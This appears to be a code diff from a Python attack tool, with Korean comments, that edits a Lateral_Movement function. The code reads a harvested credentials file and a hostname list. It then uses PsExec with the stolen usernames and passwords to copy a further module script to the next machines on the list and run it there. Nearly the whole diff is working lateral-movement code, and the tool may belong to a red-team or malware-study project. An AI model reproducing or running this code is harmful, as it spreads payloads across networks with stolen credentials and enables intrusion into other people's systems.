@@ -212,9 +212,9 @@ def Lateral_Movement():
         f.close()
 
         # 현재 pc와 리스트의 DNS가 같을 때 리스트의 다음 DNS로 측면이동 모듈2.5 전송
-        f = open('C:\module2.5\GetCredential\Credential_use_500.txt',
+        f = open('C:\module2\GetCredential\Credential_use_500.txt',
                  'r', encoding='UTF-8')
-        f1 = open(IpDiscovery_path + '\IpDiscovery_hostname.txt', 'r')
+        f1 = open('C:\module2\IpDiscovery\IpDiscovery_hostname.txt', 'r')
         line = f.readlines()
         line1 = f1.readlines()
         name = line1[0].split()
@@ -223,7 +223,7 @@ def Lateral_Movement():
             if name[0] in lists[i]:
                 j = i
                 for j in range(len(lists)-1):
-                    return_code = subprocess.Popen('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
+                    return_code = os.system('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
                                             lists[j+1] + ',\\\\' + lists[j+2] + ',\\\\' + lists[j+3] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + ' -cf C:\module2\DownloadFile-main\M2.5_v1.0.py')
 
         f.close()
